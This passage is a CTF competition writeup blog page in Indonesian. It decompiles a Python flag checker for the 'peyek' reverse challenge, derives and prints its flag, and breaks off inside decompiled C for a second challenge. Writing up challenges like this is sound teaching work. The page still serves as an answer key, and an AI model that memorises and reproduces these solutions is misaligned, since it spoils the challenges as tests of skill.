@@ -1,0 +1,1424 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        
+        <script
+            async
+            src="https://www.googletagmanager.com/gtag/js?id=G-LHYL3DDVEV"
+        ></script>
+        <script>
+            window.dataLayer = window.dataLayer || [];
+            function gtag(){dataLayer.push(arguments);}
+            gtag('js', new Date());
+
+            gtag('config', 'G-LHYL3DDVEV');
+        </script>
+
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="google-site-verification" content="rPvUCgYTOPryg6QXUsRcNaqgw7cfzujZZyi0ipJPLdM" />
+        <meta name="robots" content="noodp" />
+        <title>CTF IDSECCONF 2025 Finals Writeup - whyuhurtz&#39;s Blog</title><meta name="Description" content="My team got rank 7th at the final round."><meta property="og:url" content="https://whyuhurtz.me/2025/11/ctf-idsecconf-2025-finals-writeup/">
+  <meta property="og:site_name" content="whyuhurtz&#39;s Blog">
+  <meta property="og:title" content="CTF IDSECCONF 2025 Finals Writeup">
+  <meta property="og:description" content="My team got rank 7th at the final round.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-11-12T07:44:06+07:00">
+    <meta property="article:modified_time" content="2025-11-12T07:44:06+07:00">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Web Exploit">
+    <meta property="article:tag" content="Reverse">
+    <meta property="article:tag" content="Pwn">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="CTF IDSECCONF 2025 Finals Writeup">
+  <meta name="twitter:description" content="My team got rank 7th at the final round.">
+<meta name="application-name" content="whyuhurtz&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="whyuhurtz&#39;s Blog">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://whyuhurtz.me/2025/11/ctf-idsecconf-2025-finals-writeup/" /><link rel="prev" href="https://whyuhurtz.me/2025/11/ctf-idsecconf-2025-registration-challenge-writeup/" /><link rel="next" href="https://whyuhurtz.me/2025/12/htb-university-ctf-2025-writeup/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "CTF IDSECCONF 2025 Finals Writeup",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/whyuhurtz.me\/2025\/11\/ctf-idsecconf-2025-finals-writeup\/"
+        },"genre": "posts","keywords": "ctf, web exploit, reverse, pwn","wordcount":  3531 ,
+        "url": "https:\/\/whyuhurtz.me\/2025\/11\/ctf-idsecconf-2025-finals-writeup\/","datePublished": "2025-11-12T07:44:06+07:00","dateModified": "2025-11-12T07:44:06+07:00","license": "\u0026copy; 2023-2025","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "whyuhurtz"
+            },"description": "My team got rank 7th at the final round."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="whyuhurtz&#39;s Blog">whyuhurtz&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/projects/"> Projects </a><a class="menu-item" href="/achievements/"> Achievements </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="whyuhurtz&#39;s Blog">whyuhurtz&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/projects/" title="">Projects</a><a class="menu-item" href="/achievements/" title="">Achievements</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CTF IDSECCONF 2025 Finals Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/whyuhurtz" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>whyuhurtz</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-11-12">2025-11-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;3531 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;17 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#reverse-45">Reverse [4/5]</a>
+      <ul>
+        <li><a href="#1-peyek">1. peyek</a>
+          <ul>
+            <li><a href="#deskripsi">Deskripsi</a></li>
+            <li><a href="#langkah-penyelesaian">Langkah Penyelesaian</a></li>
+            <li><a href="#flag">Flag</a></li>
+          </ul>
+        </li>
+        <li><a href="#2-sayur">2. sayur</a>
+          <ul>
+            <li><a href="#deskripsi-1">Deskripsi</a></li>
+            <li><a href="#langkah-penyelesaian-1">Langkah Penyelesaian</a></li>
+            <li><a href="#flag-1">Flag</a></li>
+          </ul>
+        </li>
+        <li><a href="#3-begini">3. begini</a>
+          <ul>
+            <li><a href="#deskripsi-2">Deskripsi</a></li>
+            <li><a href="#langkah-penyelesaian-2">Langkah Penyelesaian</a></li>
+            <li><a href="#flag-2">Flag</a></li>
+          </ul>
+        </li>
+        <li><a href="#4-labalaba">4. labalaba</a>
+          <ul>
+            <li><a href="#deskripsi-3">Deskripsi</a></li>
+            <li><a href="#langkah-penyelesaian-3">Langkah Penyelesaian</a></li>
+            <li><a href="#flag-3">Flag</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#web-14">Web [1/4]</a>
+      <ul>
+        <li><a href="#nolnol">nolnol</a>
+          <ul>
+            <li><a href="#langkah-penyelesaian-4">Langkah Penyelesaian</a></li>
+            <li><a href="#summary-of-vulnerabilities">Summary of Vulnerabilities</a></li>
+            <li><a href="#mitigation--lessons-learned">Mitigation &amp; Lessons Learned</a></li>
+            <li><a href="#tools--techniques-used">Tools &amp; Techniques Used</a></li>
+            <li><a href="#flag-4">Flag</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#pwn-11">Pwn [1/1]</a>
+      <ul>
+        <li><a href="#todo">todo</a>
+          <ul>
+            <li><a href="#langkah-penyelesaian-5">Langkah Penyelesaian</a></li>
+            <li><a href="#flag-5">Flag</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content">My team got rank 7th at the final round.
+<h1 id="reverse-45">Reverse [4/5]</h1>
+<h2 id="1-peyek">1. peyek</h2>
+<h3 id="deskripsi">Deskripsi</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Download filenya di bawah</div>
+        </div>
+    </div>
+<h3 id="langkah-penyelesaian">Langkah Penyelesaian</h3>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>TL;DR<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Chall reverse sangat sederhana, yaitu <strong>constraint-based reversing</strong>. Cukup dekompilasi file <code>.pyc</code> yang diberikan dengan <a href="https://pylingual.io/" target="_blank" rel="noopener noreffer ">PyLingual</a> → analisis algoritma dekripsi kunci → dapat flag.</div>
+        </div>
+    </div>
+<p>Berikut adalah hasil dekompilasinya:</p>
+<p><code>extracted.py</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># filename: extracted.py</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">y</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Wrong flag!&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">x</span><span class="p">(</span><span class="n">theflag</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">theflag</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">24</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">y</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">theflag</span><span class="p">[:</span><span class="mi">5</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;flag{&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">y</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">  <span class="n">y</span><span class="p">()</span> <span class="k">if</span> <span class="n">theflag</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;}&#39;</span> <span class="k">else</span> <span class="mi">23</span>
+</span></span><span class="line"><span class="cl">  <span class="n">b</span> <span class="o">=</span> <span class="n">theflag</span><span class="p">[</span><span class="mi">5</span><span class="p">:</span><span class="mi">23</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;_&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">y</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">b</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;A&#39;</span> <span class="ow">or</span> <span class="n">b</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;A&#39;</span> <span class="ow">or</span> <span class="n">b</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;A&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">y</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">  <span class="n">c</span> <span class="o">=</span> <span class="n">b</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">:</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="n">b</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">:</span><span class="mi">3</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">c</span> <span class="o">!=</span> <span class="s1">&#39;kuda&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">y</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">b</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">3</span><span class="p">:</span><span class="mi">6</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;lah&#39;</span> <span class="ow">or</span> <span class="n">b</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">1</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;rsi&#39;</span> <span class="ow">or</span> <span class="n">b</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">4</span><span class="p">:</span><span class="mi">7</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;tek&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">y</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Congratulations! The flag is correct.&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">entry</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">  <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="n">x</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">  <span class="k">except</span> <span class="ne">FileNotFoundError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Error: file not found!&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">entry</span><span class="p">()</span></span></span></code></pre></div></div>
+<p>Berdasarkan fungsi <code>x(theflag)</code>, berikut adalah semua validasi yang dilakukan:</p>
+<p><strong>1. Constraint Dasar:</strong></p>
+<ul>
+<li>Panjang flag harus <strong>24 karakter</strong></li>
+<li>Harus dimulai dengan <code>flag{</code> (5 karakter)</li>
+<li>Harus diakhiri dengan <code>}</code> di index 23</li>
+</ul>
+<p><strong>2. Struktur Bagian Tengah:</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">theflag</span><span class="p">[</span><span class="mi">5</span><span class="p">:</span><span class="mi">23</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;_&#39;</span><span class="p">)</span>  <span class="c1"># Ambil karakter index 5-22 (18 karakter)</span></span></span></code></pre></div></div>
+<ul>
+<li>Bagian tengah harus terdiri dari <strong>3 bagian</strong> yang dipisahkan underscore <code>_</code> .</li>
+</ul>
+<p><strong>3. Constraint Detail per Bagian:</strong></p>
+<p><strong>Bagian 1 (b[0]):</strong></p>
+<ul>
+<li>Harus dimulai dengan <code>'A'</code> .</li>
+<li><code>b[0][1:3]</code> harus = <code>'ku'</code> (dari constraint <code>c = 'kuda'</code>).</li>
+</ul>
+<p><strong>Bagian 2 (b[1]):</strong></p>
+<ul>
+<li>Harus dimulai dengan <code>'A'</code></li>
+<li><code>b[1][1:3]</code> harus = <code>'da'</code> (dari constraint <code>c = 'kuda'</code>)</li>
+<li><code>b[1][3:6]</code> harus = <code>'lah'</code></li>
+</ul>
+<p><strong>Bagian 3 (b[2]):</strong></p>
+<ul>
+<li>Harus dimulai dengan <code>'A'</code></li>
+<li><code>b[2][1:4]</code> harus = <code>'rsi'</code></li>
+<li><code>b[2][4:7]</code> harus = <code>'tek'</code></li>
+</ul>
+<p><strong>Rekonstruksi Flag:</strong></p>
+<p>Mari kita susun setiap bagian:</p>
+<ul>
+<li><strong>b[0]</strong> = <code>'A'</code> + <code>'ku'</code> = <code>'Aku'</code></li>
+<li><strong>b[1]</strong> = <code>'A'</code> + <code>'da'</code> + <code>'lah'</code> = <code>'Adalah'</code></li>
+<li><strong>b[2]</strong> = <code>'A'</code> + <code>'rsi'</code> + <code>'tek'</code> = <code>'Arsitek'</code></li>
+</ul>
+<p>Gabungkan dengan underscore, maka akan membentuk string yang menyerupai sebuah flag: <code>Aku_Adalah_Arsitek</code></p>
+<p>Panjang: 3 + 1 + 6 + 1 + 7 = <strong>18 karakter</strong></p>
+<p><strong>Verifikasi:</strong></p>
+<ul>
+<li>Panjang total: 5 + 18 + 1 = <strong>24 karakter</strong></li>
+<li>Format: <code>flag{...}</code></li>
+<li>Tiga bagian dipisah underscore</li>
+<li>Semua constraint terpenuhi</li>
+</ul>
+<p><strong>Eksekusi:</strong></p>
+<p>Jika flag sudah yakin benar, tinggal masukan saja ke dalam file <code>flag.txt</code> agar extracted file <code>.pyc</code> bisa dijalankan. Jika flag benar, maka akan muncul output: <strong><code>Congratulations! The flag is correct.</code></strong></p>
+<h3 id="flag">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><code>flag{Aku_Adalah_Arsitek}</code></div>
+        </div>
+    </div>
+<h2 id="2-sayur">2. sayur</h2>
+<h3 id="deskripsi-1">Deskripsi</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Download filenya di bawah</div>
+        </div>
+    </div>
+<h3 id="langkah-penyelesaian-1">Langkah Penyelesaian</h3>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>TL;DR<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Decompile ELF binary dengan IDA → temukan key → dapatkan flag dengan cara <strong>key + 95</strong>.</div>
+        </div>
+    </div>
+<p>Hasil dekompilasi ELF binary menggunakan IDA:</p>
+<p><code>chall_decompiled.c</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="n">__noreturn</span> <span class="nf">start</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a4</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a5</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a6</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a7</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// ecx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">v14</span><span class="p">;</span> <span class="c1">// rsi
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">size_t</span> <span class="n">v15</span><span class="p">;</span> <span class="c1">// rdx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">v16</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">v17</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">retaddr</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp+0h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">retaddr</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mi">2</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">LABEL_10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v8</span> <span class="o">=</span> <span class="nf">sys_open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v14</span> <span class="o">=</span> <span class="n">aErrorOpeningFi</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v15</span> <span class="o">=</span> <span class="mi">19</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">v8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v9</span> <span class="o">=</span> <span class="nf">sys_read</span><span class="p">(</span><span class="n">v8</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x1Cu</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v9</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LABEL_9</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v12</span> <span class="o">=</span> <span class="nf">sys_close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v13</span> <span class="o">=</span> <span class="nf">sys_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LABEL_10</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v14</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_4011BD</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v15</span> <span class="o">=</span> <span class="mi">13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">goto</span> <span class="n">LABEL_13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v9</span> <span class="o">==</span> <span class="mi">27</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">26</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">buf</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">-</span> <span class="mi">95</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">aErrorOpeningFi</span><span class="p">[</span><span class="mi">45</span><span class="p">]</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="k">goto</span> <span class="n">LABEL_11</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v11</span> <span class="o">=</span> <span class="nf">sys_write</span><span class="p">(</span><span class="mi">1u</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x1Bu</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">goto</span> <span class="n">LABEL_9</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LABEL_11</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v14</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">aErrorOpeningFi</span><span class="p">[</span><span class="mi">19</span><span class="p">];</span>
